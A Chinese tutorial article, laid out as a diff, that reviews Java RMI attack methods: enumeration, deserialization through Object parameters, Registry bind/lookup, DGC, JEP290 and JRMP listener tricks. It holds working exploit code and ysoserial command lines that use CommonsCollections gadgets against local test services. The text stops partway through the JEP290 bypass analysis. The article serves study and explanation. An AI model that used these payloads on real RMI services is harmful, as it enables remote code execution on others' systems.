@@ -1,0 +1,1261 @@
+# 一文回顾攻击Java RMI方式
+
+阅读量 **520008**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2022-01-04 15:30:26
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t01b6d8f7eb499742ed.jpg)
+
+## 前序
+
+RMI存在着三个主体
+
+  * RMI Registry
+  * RMI Client
+  * RMI Server
+
+而对于这三个主体其实都可以攻击，当然了需要根据jdk版本以及环境寻找对应的利用方式。
+
+Ps.在最初接触的RMI洞是拿着工具一把梭，因此在以前看来笔者以为RMI是一个服务，暴露出端口后就可以随意攻击，现在看来是我才疏学浅了，对于RMI的理解过于片面了。本文是笔者在学习RMI的各种攻击方式后的小结，若有错误，请指出。
+
+Ps1.本文并无任何新知识点，仅仅是对于各位师傅文章的一个小总结。
+
+## RMI为何
+
+关于RMI可以阅读：<https://blog.csdn.net/lmy86263/article/details/72594760>
+
+RMI全称是Remote Method
+Invocation（远程⽅法调⽤），目的是为了让两个隔离的java虚拟机，如虚拟机A能够调用到虚拟机B中的对象，而且这些虚拟机可以不存在于同一台主机上。
+
+开头处说到了RMI的三种主体，那么以一个简单的Demo来理解RMI通信的流程。
+
+RMI中主要的api大致有：
+
+  * `java.rmi`：提供客户端需要的类、接口和异常；
+  * `java.rmi.server`：提供服务端需要的类、接口和异常；
+  * `java.rmi.registry`：提供注册表的创建以及查找和命名远程对象的类、接口和异常；
+
+首先就服务端而言，需要提供远程对象给与客户端远程调用，所谓远程对象即实现java.rmi.Remote接口的类或者继承了java.rmi.Remote接口的所有接口的远程对象。
+
+例如远程接口如下：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import java.rmi.Remote;
+    import java.rmi.RemoteException;
+    
+    public interface HelloRImpl extends Remote {
+        String hello() throws RemoteException;
+        String test() throws RemoteException;
+    }
+    
+
+需要有一个实现该接口的类：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import java.rmi.RemoteException;
+    import java.rmi.server.UnicastRemoteObject;
+    
+    public class HelloR extends UnicastRemoteObject implements HelloRImpl{
+        protected HelloR() throws RemoteException {
+        }
+    
+        @Override
+        public String hello() throws RemoteException {
+            System.out.println("hello world");
+            return "hello";
+        }
+    
+        @Override
+        public String test() throws RemoteException {
+            System.out.println("just test");
+            return "test";
+        }
+    }
+    
+
+首先有几个关键点：
+
+  * 实现方法必须抛出RemoteException异常
+  * 实现类需要同时继承UnicastRemoteObject类
+  * 只有在接口中声明的方法才能被调用到
+
+那么首先需要开启一个RMI
+Registry，开启方式也很简单，在`$JAVA_HOME/bin/`下有一个rmiregistry，因此我们可以直接利用它来开启一个Registry。
+
+    
+    
+    rmiregistry 1099
+    
+
+Tips:rmiregistry需要运行在项目的target/classes目录下，否则server端会爆出:
+
+    
+    
+    java.lang.ClassNotFoundException: com.hhhm.rmi.HelloR
+    
+
+当然了也可以直接使用代码来实现一个registry：
+
+    
+    
+    LocateRegistry.createRegistry(1099);
+    
+
+就服务端而言其实现的关键在于Naming这个类，利用bind方法将对象绑定一个名，为了方便我直接将Server和Registry放到一起：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import org.junit.Test;
+    import java.rmi.Naming;
+    import java.rmi.registry.LocateRegistry;
+    
+    public class HelloRmiServer {
+    
+        public static void main(String[] args) {
+            HelloR helloR = null;
+            try{
+                LocateRegistry.createRegistry(1099);
+                helloR = new HelloRImpl();
+                Naming.bind("rmi://127.0.0.1:1099/hell",helloR);
+                //Naming.bind("rmi://127.0.0.1:1099/hello",helloR);
+            }catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+    
+
+默认地会去绑定到localhost的1099端口，也可以指定绑定的ip、端口。
+
+客户端的操作可变性就很多了，同样是通过Naming类中提供的方法来操作，有如下几种方法：
+
+  * lookup
+  * list
+  * bind
+  * rebind
+  * unbind
+
+此处就存在有如利用unbind去解绑掉注册对象，利用bind绑定到恶意端达成攻击，此处暂且不提，回到主线，客户端同样是几行代码搞定：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import org.junit.Test;
+    
+    import java.rmi.Naming;
+    
+    public class HelloRmiClient {
+    
+        @Test
+        public void run() throws Exception{
+            String[] clazz = Naming.list("rmi://127.0.0.1:1099");
+            for (String s:clazz) {
+                System.out.println(s);
+            }
+        }
+    }
+    //opt://127.0.0.1:1099/hell
+    
+
+## 探测RMI服务接口
+
+在未知接口的情况下，除了使用list之外，还有其他方式能够获取到更详细的接口信息，其中有一个工具有做到了这一个效果：<https://github.com/NickstaDB/BaRMIe>
+
+其效果大致如下：
+
+![](https://p2.ssl.qhimg.com/t018d62b53fdddf5f39.png)
+
+而实际上nmap中也实现了这一功能：
+
+![](https://p2.ssl.qhimg.com/t01610b08b6d3370cd0.png)
+
+其原理在：[https://xz.aliyun.com/t/7930#toc-3，从文章摘抄出来总结：](https://xz.aliyun.com/t/7930#toc-3%EF%BC%8C%E4%BB%8E%E6%96%87%E7%AB%A0%E6%91%98%E6%8A%84%E5%87%BA%E6%9D%A5%E6%80%BB%E7%BB%93%EF%BC%9A)
+
+>   1. `LocateRegistry.getRegistry`获取目标IP端口的RMI注册端
+>   2. `reg.list()`获取注册端上所有服务端的Endpoint对象
+>   3.
+> 使用`reg.unbind(unbindName);`解绑一个不存在的RMI服务名，根据报错信息来判断我们当前IP是否可以操控该RMI注册端（如果可以操控，意味着我们可以解绑任意已经存在RMI服务，但是这只是破坏，没有太大的意义，就算bind一个恶意的服务上去，调用它，也是在我们自己的机器上运行而不是RMI服务端）
+>   4.
+> 本地起一个代理用的RMI注册端，用于转发我们对于目标RMI注册端的请求（在RaRMIe中，通过这层代理用注册端可以变量成payload啥的，算是一层封装；在这里用于接受原始回应数据，再进行解析）
+>   5. 通过代理服务器`reg.lookup(objectNames[i]);`遍历之前获取的所有服务端的Endpoint。
+>   6. 通过代理服务器得到lookup返回的源数据，自行解析获取对应对象相应的类细节。（因为直接让他自动解析是不会有响应的类信息的）
+>
+
+而其攻击的方式也就是根据返回的classname判断是否存在已知组件的危险服务，然后对其尝试进行攻击，所以显得这个漏洞有些没有营养，那么再看看其他攻击方式。
+
+## 在已知接口的调用方式下进行攻击
+
+其实也属于比较鸡肋的漏洞，因为在已知接口的调用方式这种情况确实比较少见，所谓已知接口的调用方式即指的是例如我们上面通过探测端口可知访问该接口的方式为：
+
+    
+    
+    rmi://127.0.0.1:1099/hell
+    
+
+同时类名为HelloR，但我们在没有服务端源码的情况下是不清楚HelloR接口下有哪些方法可以被调用，当然了这些方法的参数类型更是无从得知，不过在已知接口调用方式的情况下确实是可以利用这一方式达成攻击的。
+
+此种需要分开为两种情况：
+
+  * 参数为Object类
+  * 参数非Object类
+
+详细参考：<https://xz.aliyun.com/t/7930#toc-6>
+
+其一是为何在传输Object类的参数时都会在服务端反序列化，其关键代码位于：
+
+sun.rmi.server.UnicastServerRef#dispatch(Jdku66):
+
+![](https://p1.ssl.qhimg.com/t01241005456214e075.png)
+
+其中var4是用于校验客户端调用的方法是否与服务端存在的一致，否则会爆出：
+
+    
+    
+    unrecognized method hash: method not supported by remote object
+    
+
+var4暂且不提，服务端对于Object类型参数反序列化的点位于unmarshalValue函数内：
+
+    
+    
+        protected static Object unmarshalValue(Class<?> var0, ObjectInput var1) throws IOException, ClassNotFoundException {
+            if (var0.isPrimitive()) {
+                if (var0 == Integer.TYPE) {
+                    return var1.readInt();
+                } else if (var0 == Boolean.TYPE) {
+                    return var1.readBoolean();
+                } else if (var0 == Byte.TYPE) {
+                    return var1.readByte();
+                } else if (var0 == Character.TYPE) {
+                    return var1.readChar();
+                } else if (var0 == Short.TYPE) {
+                    return var1.readShort();
+                } else if (var0 == Long.TYPE) {
+                    return var1.readLong();
+                } else if (var0 == Float.TYPE) {
+                    return var1.readFloat();
+                } else if (var0 == Double.TYPE) {
+                    return var1.readDouble();
+                } else {
+                    throw new Error("Unrecognized primitive type: " + var0);
+                }
+            } else {
+                return var1.readObject();
+            }
+        }
+    
+
+易知在参数不是基本数据类型时会进入到else，从而进入到readObject做反序列化操作。
+
+因此打object类型的方法很简单，直接用yso生成object对象，调用即可，例如上文讲到的的HelloR类新增一个参数为object类的方法
+
+    
+    
+    void helloObject(Object payload) throws RemoteException;
+    
+
+通过lookup调用方法然后把payload传递过去即可
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import ysoserial.payloads.ObjectPayload;
+    
+    import java.rmi.Naming;
+    
+    public class AttackInterTypeofObject {
+        public static void main(String[] args) {
+            String payloadType = "CommonsCollections7";
+            String payloadArg = "open /System/Applications/Calculator.app";
+            Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType, payloadArg);
+            HelloR helloR = null;
+            try{
+                helloR = (HelloR) Naming.lookup("rmi://127.0.0.1:1099/hell");
+                helloR.helloObject(payloadObject);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+    
+        }
+    }
+    
+
+其二是绕过Object类型参数的方式比较有趣，重点在于绕过method hash。
+
+上面说到了，在Client端直接修改参数为Object时会爆出unrecognized method
+hash的错误，而在使用wireshark是可以直接抓到这一个method hash，这意味着method
+hash的值是我们可控的，也就是说我们完全可以通过修改客户端来实现攻击的利用，在：<https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/> 一文中对此也做出了总结：
+
+  * 将 java.rmi 包的代码复制到一个新的包中，并在那里更改代码
+  * 将调试器附加到正在运行的客户端并在对象序列化之前替换它们
+  * 使用[Javassist ](http://www.javassist.org/)之类的工具更改字节码
+  * 通过实现代理替换网络流上已经序列化的对象
+
+上文提到的工具BaRMIe采用第四点也就是代理替换序列化对象，而在[attacking-java-rmi-services-after-jep-290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)中使用的方法是hook掉
+[java.rmi.server.RemoteObjectInvocationHandler](https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/rmi/server/RemoteObjectInvocationHandler.java)
+类中的[invokeRemoteMethod](https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/rmi/server/RemoteObjectInvocationHandler.java)，正对应的第二个方法，在序列化前替换掉，至于选择这一个方法的原因是正如改函数名一般，这一个方法负责调用服务器上的方法。
+
+java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod
+
+    
+    
+    private Object invokeRemoteMethod(Object proxy,
+                                          Method method,
+                                          Object[] args)
+            throws Exception
+        {
+            try {
+                if (!(proxy instanceof Remote)) {
+                    throw new IllegalArgumentException(
+                        "proxy not Remote instance");
+                }
+                return ref.invoke((Remote) proxy, method, args,
+                                  getMethodHash(method));
+            } catch (Exception e) {
+                if (!(e instanceof RuntimeException)) {
+                    Class<?> cl = proxy.getClass();
+                    try {
+                        method = cl.getMethod(method.getName(),
+                                              method.getParameterTypes());
+                    } catch (NoSuchMethodException nsme) {
+                        throw (IllegalArgumentException)
+                            new IllegalArgumentException().initCause(nsme);
+                    }
+                    Class<?> thrownType = e.getClass();
+                    for (Class<?> declaredType : method.getExceptionTypes()) {
+                        if (declaredType.isAssignableFrom(thrownType)) {
+                            throw e;
+                        }
+                    }
+                    e = new UnexpectedException("unexpected exception", e);
+                }
+                throw e;
+            }
+        }
+    
+
+该函数的第三个参数允许接受对象数组，并且这第三个参数正是我们调用的接口的方法参数。
+
+对此afanti师傅写了一个rasp来hook住函数，并且将其第三个参数修改为URLDNS的gadget
+
+<https://github.com/Afant1/RemoteObjectInvocationHandler>
+
+> 1、mvn package 打好jar包
+>
+> 2、运行RmiServer
+>
+> 3、运行RmiClient前，VM
+> options参数填写:-javaagent:C:\Users\xxx\InvokeRemoteMethod\target\rasp-1.0-SNAPSHOT.jar
+>
+> 4、最终会hook住RemoteObjectInvocationHandler函数，修改第三个参数为URLDNS gadget
+
+## Attack RMI Registry via bind\lookup\others
+
+这一攻击在yso中已有实现，我们可以在项目中配置一个CommonsCollections3.1，然后启动一个RMI Registry，接下来运行：
+
+    
+    
+    java -cp yso.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"
+    
+
+能够看到计算器成功的弹出了，那么观察一下yso中的RMIRegistryExploit能够看到实际上也就是将我们的gadget使用代理Remote类的方式然后通过bind往Registry发，那么实际上在jdk8u121以前都可以这么玩，那么对此展开分析。
+
+先提出结论：
+
+在jdk<8u121的情况下，可以利用lookup，bind，unbind，rebind将gadget采用代理Remote类的方式发送给Registry，Registry接受后会进行反序列化操作。
+
+下面的分析建立在JDKu66的环境下，首先说明两个skel和stub的关系，RegistryImpl_Skel对应的是服务端，而RegistryImpl_Stub对应的是客户端，而我们的漏洞点也脱不开这两个类。
+
+其实在尝试操作Registry时会经过sun.rmi.server.UnicastServerRef#dispatch，不过因为触发漏洞的类RegistryImpl_Skel貌似无法调试，所以就怼着源码看吧，其实漏洞产生的原因还是挺简单的，位于：  
+sun.rmi.registry.RegistryImpl_Skel#dispatch:
+
+    
+    
+    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
+    
+            if (var4 != 4905912898345647071L) {
+              //根据报错可知var4是用于接口的hash校验
+                throw new SkeletonMismatchException("interface hash mismatch");
+            } else {
+                RegistryImpl var6 = (RegistryImpl)var1;
+                String var7;
+                Remote var8;
+                ObjectInput var10;
+                ObjectInput var11;
+                  //var3的值从0-4，分别对应5种行为
+                switch(var3) {
+                case 0:
+                    //0->bind
+                    var11 = var2.getInputStream();
+                    var7 = (String)var11.readObject();
+                    var8 = (Remote)var11.readObject();
+                    var6.bind(var7, var8);
+                    var2.getResultStream(true);
+                    break;
+                case 1:
+                    //1->list
+                    var2.releaseInputStream();
+                    String[] var97 = var6.list();
+                    ObjectOutput var98 = var2.getResultStream(true);
+                    var98.writeObject(var97);
+                    break;
+                case 2:
+                    //2->lookup
+                    var10 = var2.getInputStream();
+                    var7 = (String)var10.readObject();
+                    var2.releaseInputStream();
+                    var8 = var6.lookup(var7);
+                    ObjectOutput var9 = var2.getResultStream(true);
+                    var9.writeObject(var8);
+                    break;
+                case 3:
+                    //3->rebind
+                    var11 = var2.getInputStream();
+                    var7 = (String)var11.readObject();
+                    var8 = (Remote)var11.readObject();
+                    var2.releaseInputStream();
+                    var6.rebind(var7, var8);
+                    var2.getResultStream(true);
+                    break;
+                case 4:
+                    //4->unbind
+                    var10 = var2.getInputStream();
+                    var7 = (String)var10.readObject();
+                    var2.releaseInputStream();
+                    var6.unbind(var7);
+                    var2.getResultStream(true);
+                    break;
+                default:
+                    throw new UnmarshalException("invalid method number");
+                }
+    
+            }
+        }
+    
+
+简化了部分代码，然后再来简单梳理一下这段代码：
+
+在经过hash校验后会进入到几个case的判断，其中都是对应的var3的取值，从0-4分别是bind，list，lookup，rebind，unbind，而这其中的调用值是与客户端约定的。
+
+其中在sun.rmi.registry.RegistryImpl_Stub#bind中可以看到有对应的赋值：
+
+    
+    
+    super.ref.newCall(this, operations, 0, 4905912898345647071L);
+    
+
+所以也验证了0也就是对应的bind。
+
+而反序列化的触发点在于如下：
+
+    
+    
+    case 0:
+      //0->bind
+      var11 = var2.getInputStream();
+      var7 = (String)var11.readObject();
+      var8 = (Remote)var11.readObject();
+      var6.bind(var7, var8);
+      var2.getResultStream(true);
+      break;
+    
+
+这一个var2也就是上面提到的operations，一个Remote对象，那么我们将gadget代理为Remote对象后，通过这一传输过程即可达成反序列化的触发。
+
+同理在lookup，rebind，unbind中都有这一漏洞点，尽管Registry对于非本地请求的bind/unbind的行为都会做拦截的操作，但这一拦截的操作是位于bind函数内的，所以可谓是无效拦截。
+
+那么我们可以尝试自己实现一个Remote类并尝试通过bind来发送给Registry来测试思路是否正确，yso中的思路实际上利用java反序列化会递归地反序列化类内属性，因此其实就是将gadget塞到一个Remote类内的随意一个属性即可：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import ysoserial.payloads.ObjectPayload;
+    
+    import java.io.Serializable;
+    import java.rmi.Remote;
+    
+    public class RmiRegistryExploit implements Remote,Serializable {
+            private Object payload;
+    
+            public void setPayload(Object payload) {
+                this.payload = payload;
+            }
+    }
+    
+
+攻击端：
+
+    
+    
+    package com.hhhm.rmi;
+    
+    import ysoserial.exploit.RMIRegistryExploit;
+    import ysoserial.payloads.ObjectPayload;
+    
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.registry.Registry;
+    
+    public class AttackRegistry {
+        public static void main(String[] args) throws Exception{
+            String payloadType = "CommonsCollections7";
+            String payloadArg = "open /System/Applications/Calculator.app";
+            Object payloadObject = ObjectPayload.Utils.makePayloadObject(payloadType, payloadArg);
+            RmiRegistryExploit re = new RmiRegistryExploit();
+            re.setPayload(payloadObject);
+            String name = "pwned" + System.nanoTime();
+            Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1099);
+            registry.bind(name,re);
+    
+        }
+    }
+    
+
+同理地可以利用lookup，unbind等方法。
+
+在jdk8u141后对于bind，rebind，unbind的请求都会先进行一次本地校验，即只允许服务端发出，不过于lookup，list而言依旧没有限制。
+
+不过lookup的参数为字符串，在利用时比较麻烦，如何利用在后文讲bypass JEP290时会提到。
+
+## Attack DGC
+
+先介绍DGC。
+
+分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。
+
+而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI
+Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。
+
+而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。
+
+就触发反序列化而言，其实跟前面提到的bind的代码逻辑类似，DGCImpl_Skel#dispatch：
+
+    
+    
+    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
+      //判断接口的hash
+      if (var4 != -669196253586618813L) {
+        throw new SkeletonMismatchException("interface hash mismatch");
+      } else {
+        DGCImpl var6 = (DGCImpl)var1;
+        ObjID[] var7;
+        long var8;
+        switch(var3) {
+          case 0:
+            VMID var39;
+            boolean var40;
+            //获取连接的输入流
+            ObjectInput var14 = var2.getInputStream();
+            //反序列化
+            var7 = (ObjID[])var14.readObject();
+            var8 = var14.readLong();
+            var39 = (VMID)var14.readObject();
+            var40 = var14.readBoolean();
+            var2.releaseInputStream();
+            var6.clean(var7, var8, var39, var40);
+            var2.getResultStream(true);
+            break;
+            }
+      }
+    }
+    
+
+省略了部分代码，只截取了case
+0也就是clean的操作，漏洞的触发点也就是这里的readObject，在clean之前对我们传的值做反序列化的操作，原理很简单，主要是解决如何和DGC服务端通信的问题。
+
+DGCImpl_Stub#clean:
+
+    
+    
+    public void clean(ObjID[] var1, long var2, VMID var4, boolean var5) throws RemoteException {          //DGC连接      RemoteCall var6 = super.ref.newCall(this, operations, 0, -669196253586618813L);          //获取连接诶的输出流      ObjectOutput var7 = var6.getOutputStream();          //序列化      var7.writeObject(var1);      var7.writeLong(var2);      var7.writeObject(var4);      var7.writeBoolean(var5);      super.ref.invoke(var6);      super.ref.done(var6);    }
+    
+
+同样的省略部分代码，可以看到`ObjID[]
+var1`做的序列化操作在DGCImpl_Skel#dispatch中会进行反序列化操作，那么只需要把var1替换为我们的payload即可达成利用，然而需要更改底层代码这种繁杂的操作yso早已替我们实现——ysoserial.exploit.JRMPClient#main:
+
+    
+    
+        public static final void main ( final String[] args ) {        if ( args.length < 4 ) {            System.err.println(JRMPClient.class.getName() + " <host> <port> <payload_type> <payload_arg>");            System.exit(-1);        }        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);        String hostname = args[ 0 ];        int port = Integer.parseInt(args[ 1 ]);        try {            System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));            makeDGCCall(hostname, port, payloadObject);        }        catch ( Exception e ) {            e.printStackTrace(System.err);        }        Utils.releasePayload(args[2], payloadObject);    }
+    
+
+main函数没什么东西，主要是接受命令行传参然后调用makeDGCCall函数发起一个DGC通信，因此可以把重点放在makeDGCCall函数上：
+
+    
+    
+    public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
+            InetSocketAddress isa = new InetSocketAddress(hostname, port);
+            Socket s = null;
+            DataOutputStream dos = null;
+            try {
+                s = SocketFactory.getDefault().createSocket(hostname, port);
+                s.setKeepAlive(true);
+                s.setTcpNoDelay(true);
+    
+                OutputStream os = s.getOutputStream();
+                dos = new DataOutputStream(os);
+                  //传输协议
+                dos.writeInt(TransportConstants.Magic);
+                dos.writeShort(TransportConstants.Version);
+                dos.writeByte(TransportConstants.SingleOpProtocol);
+                dos.write(TransportConstants.Call);
+    
+                @SuppressWarnings ( "resource" )
+                final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+    
+                objOut.writeLong(2); // DGC
+                objOut.writeInt(0);
+                objOut.writeLong(0);
+                objOut.writeShort(0);
+    
+                objOut.writeInt(1); // dirty
+                objOut.writeLong(-669196253586618813L);
+    
+                objOut.writeObject(payloadObject);
+    
+                os.flush();
+            }
+            finally {
+                if ( dos != null ) {
+                    dos.close();
+                }
+                if ( s != null ) {
+                    s.close();
+                }
+            }
+        }
+    
+
+yso中通过直接用socket发包，首先是往socket写入传输协议数据流，其头部通常如下：
+
+    
+    
+    from https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html
+    0x4a 0x52 0x4d 0x49 Version Protocol
+    Version:
+        0x00 0x01
+    Protocol:
+        StreamProtocol 0x4b
+        SingleOpProtocol 0x4c
+        MultiplexProtocol 0x4d
+    Messages:
+        Message
+        Messages Message
+            Message:
+            Call 0x50 CallData
+            Ping 0x52
+            DgcAck 0x54 UniqueIdentifier
+    
+
+也就对应于sun.rmi.transport.TransportConstants中定义的内容了：
+
+    
+    
+    public class TransportConstants {
+        public static final int Magic = 1246907721; //0x4a 0x52 0x4d 0x49
+        public static final short Version = 2;
+        public static final byte StreamProtocol = 75;
+        public static final byte SingleOpProtocol = 76;
+        public static final byte MultiplexProtocol = 77;
+        public static final byte ProtocolAck = 78;
+        public static final byte ProtocolNack = 79;
+        public static final byte Call = 80;
+        public static final byte Return = 81;
+        public static final byte Ping = 82;
+        public static final byte PingAck = 83;
+        public static final byte DGCAck = 84;
+        public static final byte NormalReturn = 1;
+        public static final byte ExceptionalReturn = 2;
+    
+        public TransportConstants() {
+        }
+    }
+    
+
+不难理解此处写入TransportConstants.Call也就是对应到代码里的super.ref.newCall了。比较不理解的是：
+
+    
+    
+    final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+    
+
+在写入DGC之前为何用MarshalOutputStream将数据流包裹起来？
+
+跟了一下发现在UnicastServerRef中用到了MarshalInputStream，好吧，破案了，其实就是把jdk自带的MarshalOutputStream拷贝过去，不过yso中的MarshalOutputStream与jdk自带的略有不同，有师傅讲到了这一点：<https://blog.sometimenaive.com/2020/09/02/attack-rmi-registry-and-server-with-socket/>
+
+> 刚开始用jdk自带的`sun.server.rmi.MarshalOutputStream`
+> 没有问题，但是传`UnicastRefRemoteObject`
+> 对象的时候，发现死活传不过去，后来发现jdk自带的`sun.server.rmi.marshalOutputStream`
+> 会进行replaceObject，后来就直接换成了ysoserial中的`MarshalOutputStream` 这样就没啥问题了。
+
+余下写入的序列化内容就是DGC的固定格式，然后走入dirty分支，传入接口的hash值，最后将payload写入。
+
+在jdk6u141, 7u131,
+8u121之后，出现了JEP290规范之后，无论是DGC还是前面提到的bind等方法去攻击Registry的方式都失效了。
+
+## JEP290
+
+官方将本属于JDK9的特性进行了向下兼容，于是在jdk6，7，8中也出现了这一特性，分别对应于jdk6u141, 7u131, 8u121之后的版本。
+
+JEP290是为了过滤传入的序列化数据而产生的规范，开发者可通过配置自定义过滤器，全局过滤器或者使用内置过滤器来对传入的序列化数据做过滤。
+
+其中在RMIRegistryImpl中采用了白名单机制来限制类：
+
+![](https://p5.ssl.qhimg.com/t01a64383aaab7f2d0c.png)
+
+他会去递归检查我们传入的序列化数据，因此尽管我们传入的是Remote对象，但最终还是会把我们的payload对象拦截下来导致前面提到的通过bind攻击的方式失效。
+
+关于JEP290更多详细可以看：<https://www.cnpanda.net/sec/968.html> 和
+<https://paper.seebug.org/1689/>
+
+下面的环境建立的JDKu181，再次启动RMI
+Registry后用yso中的ysoserial.exploit.RMIRegistryExploit打会发现爆出了这样的错误：
+
+![](https://p2.ssl.qhimg.com/t01ad83c73b5382d5d6.png)
+
+这样就是上面提到的JEP290中的过滤器，DGC的攻击方式也绕不开这一个过滤器。
+
+白名单如下：
+
+    
+    
+    java.rmi.Remote
+    java.lang.Number
+    java.lang.reflect.Proxy
+    java.rmi.server.UnicastRef
+    java.rmi.activation.ActivationId
+    java.rmi.server.UID
+    java.rmi.server.RMIClientSocketFactory
+    java.rmi.server.RMIServerSocketFactory
+    
+
+## JRMP服务端打客户端
+
+在bypass JEP290之前先了解一下通过服务端打客户端，尽管看起来有点扯，不过事实确实如此，JRMP客户端也同样可以被服务端打。
+
+直接用yso的模块起一个服务端：
+
+    
+    
+    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections7 "open /System/Applications/Calculator.app
+    
+
+客户端代码就两行：
+
+    
+    
+    Registry registry =  LocateRegistry.getRegistry("127.0.0.1", 1199);registry.lookup("hell");
+    
+
+运行了你马上就弹计算器。既然打客户端那自然是在RegistryImpl_Stub下断点，因为是调用lookup，于是在lookup处断点：
+
+    
+    
+    public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {  RemoteCall var2 = this.ref.newCall(this, operations, 2, 4905912898345647071L);  ObjectOutput var3 = var2.getOutputStream();  var3.writeObject(var1);  this.ref.invoke(var2);  Remote var22;  ObjectInput var4 = var2.getInputStream();  var22 = (Remote)var4.readObject();  this.ref.done(var2);}
+    
+
+tips：这里调试时可能会因为rmi连接断开从而导致触发不了payload，因此最好直接用步过来调试。
+
+跟入this.ref.newCall会发现这个ref类实际上是UnicastRef类，不过漏洞的触发点不在这，往后跟，会发现漏洞的触发点于UnicastRef#invoke触发，再往里跟sun.rmi.transport.StreamRemoteCall#executeCall:
+
+    
+    
+    public void executeCall() throws Exception {
+        DGCAckHandler var2 = null;
+        byte var1;
+        this.releaseOutputStream();
+        DataInputStream var3 = new DataInputStream(this.conn.getInputStream());
+        byte var4 = var3.readByte();
+        if (var4 != 81) {
+          if (Transport.transportLog.isLoggable(Log.BRIEF)) {
+            Transport.transportLog.log(Log.BRIEF, "transport return code invalid: " + var4);
+          }
+          this.getInputStream();
+          var1 = this.in.readByte();
+          this.in.readID();
+    
+          var2.release();
+    
+          switch(var1) {
+            case 1:
+              return;
+            case 2:
+              Object var14;
+              //漏洞点
+              var14 = this.in.readObject();
+            }
+        }
+    }
+    
+
+会发现漏洞点在case
+2这里，实际上是TransportConstants.ExceptionalReturn，对应的代码也可以在ysoserial.exploit.JRMPListener中看到写入：
+
+    
+    
+    oos.writeByte(TransportConstants.ExceptionalReturn);
+    
+
+而之后的this.in.readObject()就是我们反序列化的漏洞点了，代码运行到这计算器也就弹出来了，而lookup的打法也因为不受jdk8u141的本地限制而在高版本JDK中被广泛利用到。
+
+可能有读者疑惑为什么要用服务端打客户端，除了反制的情况之外还能怎么用？实际上这就是下面要讲的JRMP bypass JEP290的利用方式：
+
+通过反序列化时进行一次rmi连接，配合lookup不受本地连接的限制连接我们的JRMPServer从而实现bypass JEP290。
+
+当然大前提是可以进行反序列化，我们卡在JEP290的一个很重要的点也是因为没办法反序列化我们的payload。
+
+## JDK<8u141 bypass JEP290 via bind
+
+JRMP实际上就是一个协议，同http一般基于tcp/ip之上的协议，RMI的过程就是利用JRMP协议去进行通信，在JDKu121之后，也就是JEP290出现之后，RMI的主要利用方式就转移到了JRMP协议的利用上。
+
+bypass方式其实是找到JEP290中rmi过滤器的白名单类中的类来bypass实现反序列化，来看看yso中JRMPClient（payload）:
+
+    
+    
+     * UnicastRef.newCall(RemoteObject, Operation[], int, long) * DGCImpl_Stub.dirty(ObjID[], long, Lease) * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long) * DGCClient$EndpointEntry.registerRefs(List<LiveRef>) * DGCClient.registerRefs(Endpoint, List<LiveRef>) * LiveRef.read(ObjectInput, boolean) * UnicastRef.readExternal(ObjectInput)
+    
+
+tips:此处的readExternal同样可以作为反序列化的入口，在调用readObject时会调用到它。
+
+直接在UnicastRef#readExternal断个点：
+
+![](https://p0.ssl.qhimg.com/t012eb7ec40883daca0.png)
+
+然而在将反序列化过程跟完后会发现payload仍没有执行，实际上反序列化过程也就是readObject处只是做了ref的装载，执行了两步：
+
+    
+    
+     * LiveRef.read(ObjectInput, boolean) * UnicastRef.readExternal(ObjectInput)
+    
+
+真正进行rmi连接实际上是位于sun.rmi.registry.RegistryImpl_Skel#dispatch的releaseInputStream：
+
+![](https://p5.ssl.qhimg.com/t01d54f1f3a8adce9f3.png)
+
+在sun.rmi.transport.ConnectionInputStream#registerRefs处执行registerRefs，而incomingRefTable实际上就是在前面反序列化时将ref填充入的一个table：
+
+    
+    
+        void registerRefs() throws IOException {
+            if (!this.incomingRefTable.isEmpty()) {
+                Iterator var1 = this.incomingRefTable.entrySet().iterator();
+    
+                while(var1.hasNext()) {
+                    Entry var2 = (Entry)var1.next();
+                      //在DGC注册ref
+                    DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());
+                }
+            }
+    
+        }
+    
+
+一路调用最终到sun.rmi.transport.DGCImpl_Stub#dirty:
